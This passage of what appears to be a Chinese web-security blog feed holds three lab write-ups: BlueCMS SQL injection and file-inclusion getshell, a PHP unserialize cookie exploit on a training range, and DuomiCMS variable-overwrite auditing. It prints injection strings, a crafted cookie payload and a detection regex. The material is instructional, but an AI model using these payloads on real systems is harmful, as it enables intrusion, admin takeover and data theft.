<p>1’ and updataxml(1,concat(0x7e,(select database())),1),1)#</p>
<p>闭合问题</p>
<p>前台GETshell 带走服务器</p>
<p><strong>windows路径长度限制</strong> include 长度最大限制</p>
<p>截断方法 5.3以下</p>
<p>../../1.txt………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………<br>文件包含+图片马=组合拳<br>文件写入</p>
<h2 id="漏洞地方3：文件包含漏洞-图片马组合拳"><a href="#漏洞地方3：文件包含漏洞-图片马组合拳" class="headerlink" title="漏洞地方3：文件包含漏洞+图片马组合拳"></a>漏洞地方3：文件包含漏洞+图片马组合拳</h2><p>INSERT INTO blue_comment (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (‘’, ‘1’, ‘1’, ‘1’, ‘6’, ‘awfeeawfeaw’, ‘1618448970’, ‘192.168.136.1’, ‘1’)</p>
<p>‘or updataxml(1,concat(0x7e,(select database()),1) ,1)#</p>
<blockquote>
<p><strong>1、因为GET POST COOKIE传参都会被魔术引号处理 我们可以尝试一下是否会被魔术引号转义，Head请求头注入XXF</strong></p>
</blockquote>
<p><strong>当我们在index文件中添加die进行输出页面测试使用GET进行传参时，发现GET/REQUEST/POST都会被魔术引号转义</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/46d2fe2a6ca4ce381899420f78d4406a.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/080d79d4f43ef30a452e96b65ce8020f.png" alt=""><br><strong>所以我们选择尝试用head请求头burp进行抓包传参，使用$_SERVER[‘HTTP_USER_AGENT’]来接收传参</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/7db0c6130cc2584599161c052bfb8790.png" alt=""><br><strong>burp抓包</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/cfe76247101ad7c899dfb7960d920224.png" alt=""><br><strong>发现并没有被魔术引号转义，测试出可能会有head请求头注入</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/306ab794c84cace740ada4b7920ef29d.png" alt=""><br><strong>尝试在审计系统里面全局搜索SERVER，突然发现ip变量，并且同时存在调用函数getip()</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/50a4643df1da178fdc5c390bcbe16eec.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/10b1154f8817ac6fae19f1bc738f7504.png" alt=""><br><strong>于是我寻找getip的关键词，发现了sql语句insert into并且有插入getip()</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/74ba247f749abbf9a78aa8a7cfb4a3c4.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/6a2118f8c7bf5d950df020760831dea7.png" alt=""><br><strong>存在XXF，进行尝试，发现这个ip传参是在评论系统里面，于是我们进行评论</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/4708c6a8c2e5716304c231d1a4d22a10.png" alt=""><br><strong>进入mysql监控，查看是进行了什么sql语句，可以看出是传入是我们的X-Forwaded-For所以可以进行抓包head头报错注入</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/4f6a02af2ad0d9f229ec8fe18b1fe5aa.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/b9f9f0543f8bc1c62b14703e313b0177.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/d0bb1e127c55862107dca565e22861ee.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/ceb408e5d1815419eef403e389b0991f.png" alt=""><br><strong>我们可以采用sqlmap进行盲注，因为会报错，在需要跑sql语句的地方打*用level3级</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/6d3a4e9703735d19db7f8cfea2a8c663.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/c519489694dccb587ac19af0d0b615a8.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/9c3340707583c49d3b107865fd241e45.png" alt=""><br><strong>接着就完成盲注了。</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/43294d9ee6410425c203054179a6970c.png" alt=""></p>
<h3 id="本地文件包含漏洞前台getshell图文操作"><a href="#本地文件包含漏洞前台getshell图文操作" class="headerlink" title="本地文件包含漏洞前台getshell图文操作"></a><strong>本地文件包含漏洞前台getshell图文操作</strong></h3><p><img src="https://img-blog.csdnimg.cn/img_convert/3fc011c3904842320baf7e356b5c2b1d.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/7a237ec6e3e59f45f784ad4b0929bf27.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/cbfd0cb0682196f08f9b6895ff53c545.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/67dbf77a8610b01798ce184be4ab44c2.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/f970e71679eff64c451ac9b1ebc05827.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/295a9444dae03d8ef1a4581fbe97250e.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/0a52e1107ef5384e43e29a09b599cd35.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/3324de803b6dd047073cab6ec081a644.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/43eb08d94e177f244558c639283f250f.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/80a4600de8133829781840f0b55f5e3e.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/a2310dabd5123ceeeff39c49b72dc25f.png" alt=""><br><strong>因为这个inlcude包含的路径是固定的include/payment/‘.$_POST[‘pay’].”/index.php，在php5.3以下的版本可以进进行windows路径长度限制256进行截断最后的index.php，所以我们尝试截断</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/103c9b877c2c1ada74c55135d3d236b3.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/e34ecb333c51f7fb72b2edddf441bbaa.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/cc93796b24c074a731b148fd2bcb4d99.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/c96980cbe2b60f874397976a8b33b86e.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/53ede1b93a3888071e010d08b51855a5.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/1e44494fe97c91ae92e5c13efd14976c.png" alt=""></p>
<p><strong>但是我们只是在本地上创建文件所以成功，接下来我们进行图片马</strong></p>
<h3 id="图片马和文件包含组合"><a href="#图片马和文件包含组合" class="headerlink" title="图片马和文件包含组合"></a>图片马和文件包含组合</h3><p><strong>制作一个能写入文件的图片马</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/005c6b1ce34c36cac274ea68e7317eb2.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/7719764ffa54598a93b2aece50d45241.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/04244488ec514e87d4d6f253dcbd90ea.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/1f7c6cde3c062c61fc1cd8b83405c81c.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/d215d281cf2975df64022eb86c2c89f7.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/5e969a2676615407430d0dd02f0adcae.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/788e4f756a6a6405d6ffbc3f6c4ec286.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p><strong>BlueCMS</strong>:目前操作中，能发现万能密码、mysql注入、盲注、head头注入（XXF）、XXS反射、存储、DOM、文件包含漏洞、文件上传漏洞，其他的还有很多等。</p>
</blockquote>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>unserialize反序列化漏洞</title>
    <url>/posts/20.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>什么是序列化？</strong></p>
<p>序列化（serialize）是将对象的状态信息转换为可以存储或传输的形式过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。【将状态信息保存为字符串】</p>
<p><strong>简单的理解</strong>：将php中 对象、类、数组、变量、匿名函数等，转化为字符串，方便保存到数据库或文件中</p>
<p><strong>什么是反序列化？</strong></p>
<p>序列化就是将对象的状态信息转为字符串存储起来，那么反序列化就是再将这个状态信息拿出来使用。（重新再转化为对象或者其他的）【将字符串转化为状态信息】</p>
<blockquote>
<p>当在php中创建了一个对象后，可以通过serialize（）把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">class chybeta&#123;</span><br><span class="line">    var $test&#x3D;&#39;123&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$class1 &#x3D; new chybeta; &#x2F;&#x2F;新建对象</span><br><span class="line">$class1_ser&#x3D;serialize($class1);</span><br><span class="line">echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">print_r($class1_ser);</span><br><span class="line">&#x2F;&#x2F; 0:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;</span><br><span class="line">&#x2F;&#x2F;变量类型:类名长度:类名:属性数量:</span><br><span class="line">&#x2F;&#x2F;&#123;属性类型:属性名长度:属性名;属性值类型:属性值内容;&#125;</span><br><span class="line">&#x2F;&#x2F; 0表示object对象,7表示对象的名称有7个字符</span><br><span class="line">&#x2F;&#x2F;chybeta 对象名称 1 表示只有一个值</span><br><span class="line">&#x2F;&#x2F;&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;</span><br><span class="line">&#x2F;&#x2F;s 表示string 字符串 4 表示test 字符串长度</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411202158339-1254244174.png" alt=""></p>
<blockquote>
<p>与serialize()对应的，unserialize（）可以从已存储的表示中创建php的值，单就本次环境而言，可以从序列化后的结果中恢复对象（object）</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test=<span class="string">'123'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$class2 = <span class="string">'O:7:"chybeta":1:&#123;s:4:"test";s:3:"124";&#125;'</span>; <span class="comment">//</span></span><br><span class="line">$class2_unser=unserialize($class2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">print_r($class2_unser);</span><br><span class="line"><span class="comment">// O:7:"chybeta":1:&#123;s:4:"test";s:3:"124";&#125;</span></span><br><span class="line"><span class="comment">// O:7:"chybeta":1:&#123;s:4:"test";s:3:"124";&#125;</span></span><br><span class="line"><span class="comment">//变量类型:类名长度:类名:属性数量:</span></span><br><span class="line"><span class="comment">//&#123;属性类型:属性名长度:属性名;属性值类型:属性值内容;&#125;</span></span><br><span class="line"><span class="comment">// O表示object对象,7表示对象的名称有7个字符</span></span><br><span class="line"><span class="comment">//chybeta 对象名称 1 表示只有一个值</span></span><br><span class="line"><span class="comment">//&#123;s:4:"test";s:3:"123";&#125;</span></span><br><span class="line"><span class="comment">//s 表示string 字符串 4 表示test 字符串长度</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411203044611-668318842.png" alt=""></p>
<p><strong>本质上serialize（）和unserialize（）在php内部实现上是没有漏洞的，漏洞的主要产生是由于应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</strong></p>
<p><em>当传给unserialize()的参数可控时,那么用户就可以注入精心构造的<strong>payload</strong>。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。</em></p>
<blockquote>
<p>php<strong>中有一类特殊的方法叫”Magic function”</strong>（魔术方法），这里我们着重关注一下几个：</p>
</blockquote>
<p>1、<strong>__construct()：</strong>当对象创建（new）时会自动调用。但在unserialize（）时是不会自动调用的。（构造函数）</p>
<p>2、<strong>__destruct()：</strong>当对象呗销毁时会自动调用。（析构函数）</p>
<p>3、<strong>__wakeup()：</strong>如前所提，unserialize（）时会自动地调用。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"__wakeup"</span>.<span class="string">"  //"</span>.<span class="string">"unserialize()会检查是否存在一个__wakeup()方法。 如果存在，则会先调用__wakeup方法, 预先准备对象需要"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"__construct"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"__destruct"</span>.<span class="string">"  //"</span>.<span class="string">"析构函数会在某个对象的所有引用都被删除或者当对象被显式销毁时执行"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$class2=<span class="string">'O:7:"chybeta":1:&#123;s:4:"test";s:3:"124";&#125;'</span>;</span><br><span class="line">print_r($class2);</span><br><span class="line">$class2_unser=unserialize($class2);</span><br><span class="line"><span class="comment">//print_r($class2_unser);</span></span><br><span class="line"><span class="comment">//echo "&lt;/br&gt;";//php脚本结束,释放__destruct</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411204911392-1997351730.png" alt=""></p>
<blockquote>
<p><strong>首先来了解下“__toString()”方法，当打印一个对象时，如果定义了“__toString()”方法，就能在测试时，通过echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。</strong></p>
</blockquote>
<p>封神台靶场：<a href="http://59.63.200.79:8010/uns/index.php?source" target="_blank" rel="noopener">http://59.63.200.79:8010/uns/index.php?source</a><br><strong>同时发现$s-&gt;source=__FILE__存在可控变量</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/7d729d6270ad3f7e5d5e5d24bbf778c1_77939.png" alt="img"></p>
<p><strong>尝试构造序列化对象</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/74784874ae21c4c90ef0d0f2aede0a13_66848.png" alt="img"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">readme</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> highlight_file(<span class="string">'Readme.txt'</span>, <span class="keyword">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>——tostring()魔术方法，当输出一个文件对象时，将其转化为字符串输出，且显示为代码高亮；</strong></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[‘source’]))&#123;</span><br><span class="line">$s = <span class="keyword">new</span> readme();</span><br><span class="line">$s-&gt;source = FILE__;</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>获取get传参中source的值（有的话），$S新生成一个对象，对象中的source属性指向为__FILE__（即目录本身、当前路径），输出$_s这个对象（当然输出时为自动调用__ToString()魔术方法）。最后有一个exit，执行这一块会退出,所以我们不能让这一块执行，所以不能有get传参。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[‘todos’]))&#123;</span><br><span class="line">$c = $_COOKIE[‘todos’];</span><br><span class="line">$h = substr($c, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">$m = substr($c, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(md5($m) === $h)&#123;</span><br><span class="line">$todos = unserialize($m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>这一块是对cookie的检测和执行，并且有反序列化函数unserialize（），所以这一块是我们需要操作的。这一段代码首先获取传入的cookie值赋值给$c,并且cookie的前三十二位值赋值给$h，后面的赋值给$m，如果后三十二位MD5编码结果与前三十二位相同，则为$todos赋值$m作为参数反序列化执行的结果。配合下面一段代码遍历输出$todos。</strong></p>
<p>1、<strong><li><?=$todo?></li>直接输出，则会调用__toString（）方法</strong></p>
<p>2、<strong>而在 $s-&gt;source = FILE; 存在可控变量</strong></p>
<p>3、<strong>想要读取flag.php则需要满足条件md5($m) === $h</strong></p>
<p>4、<strong>所以我们尝试构造 $m = serialize($todos)和$h = md5($m)满足这两个条件</strong></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($todos <span class="keyword">as</span> $todo):<span class="meta">?&gt;</span></span><br><span class="line">&lt;li&gt;<span class="meta">&lt;?</span>=$todo<span class="meta">?&gt;</span>&lt;/li&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>再下面一段是关于POST传参的判断执行（没有反序列化函数，不能利用）：</strong></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[‘text’]))&#123;</span><br><span class="line">$todo = $_POST[‘text’];</span><br><span class="line">$todos[] = $todo;</span><br><span class="line">$m = serialize($todos);</span><br><span class="line">$h = md5($m);</span><br><span class="line">setcookie(‘todos’, $h.$m);</span><br><span class="line">header(‘Location: ‘.$_SERVER[‘REQUEST_URI’]);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>然后我们就要利用cookie的传参来读取flag.php这一文档</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$c = $_COOKIE[<span class="string">'todos'</span>]; =&gt; 我们传入的</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img-blog.csdnimg.cn/img_convert/8492b5fb73f56ac306faf131fc559c6c.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cfef5a21b56aa225e2926b9e04b1d90a.png" alt="img"></p>
<p>;转为url编码%3b</p>
<p>e2d4f7dcc43ee1db7f69e76303d0105ca:1:{i:0%3bO:6:”readme”:1:{s:6:”source”%3bs:8:”flag.php”%3b}}</p>
<p> <strong>复制到cookie里面直接读出flag.php源码</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/0547b93441faa6a0249e68f3239b866b_77812.png" alt="img"></p>
<p><img src="https://bbs.zkaq.cn/upload/md/e0fd1bb98ed3bad774ea508ecc39fd44_73096.png" alt="img"></p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计--Duomicms变量覆盖函数</title>
    <url>/posts/19.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p><strong>白盒审计：</strong>白盒代码安全审计是常用的安全审计方法之一，是基于静态遍历代码逻辑的一种审计方式。</p>
</blockquote>
<p><strong>工具</strong>：<a href="https://github.com/euphrat1ca/SeaySourceCodeCheck/releases/tag/1" target="_blank" rel="noopener">Seay源代码审计系统</a>、虚拟机服务器、DuomiCMS源码。</p>
<blockquote>
<p>此次我们审计一个CMS，首先在本地虚拟机中安装好，方便审计时此时我们审计一个CMS,首先在本地虚拟机中安装好，方便审计时测试</p>
</blockquote>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411105235450-761458149.png" alt=""></p>
<blockquote>
<p><strong>Cms系统源文件张贴进虚拟机——安装</strong></p>
</blockquote>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411105627949-89801874.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411110545992-869221068.png" alt=""></p>
<blockquote>
<p><strong>建议使用5.x以下是phpstudy不然需要配置ini</strong></p>
</blockquote>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411110718720-1983062519.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411110811759-737830041.png" alt=""></p>
<p><strong>安装成功</strong></p>
<p><em>常规的审计方法一般有两种：</em></p>
<p><em>1、从index.php一步步去看别的页面。</em></p>
<p><em>2、危险函数搜索。本次主要尝试变量覆盖漏洞的审计，采用第二种方法</em></p>
<p><strong><em>变量覆盖漏洞：变量覆盖值指的是可以用我们自定义的参数值替换程序原有的变量值</em></strong></p>
<p><strong>怎么去寻找变量覆盖？</strong></p>
<p><em>经常导致变量覆盖漏洞场景有：$$使用不当，extract()函数使用不当，parse_str()函数使用不当import_request_variables()使用不当，开启了全局变量注册等。变量覆盖漏洞有时候可以直接让我们webshell，拿到服务器的权限</em></p>
<p><strong>经常引发变量覆盖漏洞的函数有：extract() | parse_str()  | import_request_variables()</strong></p>
<p><strong>extract()函数(作用：将数组中变量导入到当前的符符号表)</strong></p>
<p><strong>上例题</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;1&quot;;</span><br><span class="line">$my_array &#x3D; array(&quot;a&quot; &#x3D;&gt; &quot;Cat&quot;,&quot;b&quot; &#x3D;&gt; &quot;Dog&quot;, &quot;c&quot; &#x3D;&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;\$a &#x3D; $a; \$b &#x3D; $b; \$c &#x3D; $c&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>运行结果：$a = Cat; $b = Dog; $c = Horse</p>
</blockquote>
<p><strong>parse_str()将查询字符串解析到变量中:</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">parse_str(&quot;name&#x3D;zkaq&amp;&amp;age&#x3D;60&quot;);   &#x2F;&#x2F; test&#x3D;123&amp;gift&#x3D;123</span><br><span class="line">echo $name.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $age;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411160926565-1042511209.png" alt=""></p>
<p><strong>输出了zkaq和60</strong><br><strong>那么parse_str(“name=Bill&amp;age=60”) 相当于完成了$name =’zkaq’和$age =’60’</strong><br><strong>那么如果在parse_str中可以直接传参的话，那么是不是也可以覆盖变量呢。</strong></p>
<p><strong>不仅仅是函数会导致变量覆盖，有些特殊符号的特殊搭配也会引起变量覆盖漏洞，比如$$</strong></p>
<p><strong>$$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test 会将$name的值覆盖，变为test。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key=&gt;$_value) </span><br><span class="line">&#123;$$_key=addslashes($_value);&#125;&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>


<blockquote>
<p><strong>这个代码会接受我们GET提交、POST提交、COOKIE参数，将这个接受来的参数依次放入$_REQUEST</strong></p>
<p>$_key=&gt;$_value 这个是数组解析，实际上就是键值分离</p>
<p>正常而言$a=1是一个定值,但是因为_key的缘故,当我传参a=2;那么key=addslashes($_value);就变为了$a=2.</p>
<p><strong>首先在审计软件中加入本次漏洞全局搜索规则：</strong></p>
</blockquote>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411113229004-1750202241.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411114511786-1078136745.png" alt=""></p>
<blockquote>
<p>系统配置——添加规则（就是存在漏洞的地方）</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">规则：([^\$&quot;]|$)\$\&#123;?\$</span><br><span class="line">描述：$$变量覆盖漏洞</span><br></pre></td></tr></table></figure></div>

<p> <img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411114802766-7196608.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411114823593-1873670610.png" alt=""></p>
<p><strong>添加成功</strong></p>
<p><em>全局搜索功能：搜索你感觉看不大懂的函数，因为很可能是自定义函数：</em></p>
<p>我们本次要找的是doumiphp\common.php文件的$$变量覆盖漏洞：直接定位就不搜索了</p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411115409028-40369347.png" alt=""></p>
<p>看一看这个变量函数满足的条件</p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411162651877-824113813.png" alt=""></p>
<p><strong>1、必须要有传参</strong></p>
<p><strong>2、正则匹配不能有键名有cfg和GLOBALS传参中有$_k</strong></p>
<p><strong>3、不能有COOKIE传参中有$_k</strong></p>
<blockquote>
<p>这个系统有一个问题是cookie和session绑定，而且普通用户和管理员的session只有轻微的不同，我们只需要在一个接收session传参并且存在变量覆盖漏洞的页面将传参修改，便可获得管理员权限，登录管理员后台（），其中我们需要找到管理员的session值和普通用户的session的区别，分别抓取两个session的值对比：</p>
</blockquote>
<p><img src="https://bbs.zkaq.cn/upload/md/a8bcd56df198e6c5ec5dba7d008f9a29_87585.png" alt="img"></p>
<p><strong>接着找到这个检查核对的页面：找不到目录怎么办：</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/7a9aacb52d2b5057b580e7fe05163002_41636.png" alt="img"></p>
<p><strong>加一行修改虚拟机里的源代码，登录测试爆出绝对路径：不知道文件位置的情况：在该页面中写入die()函数，当测试执行时网页报错会显示出绝对路径。</strong></p>
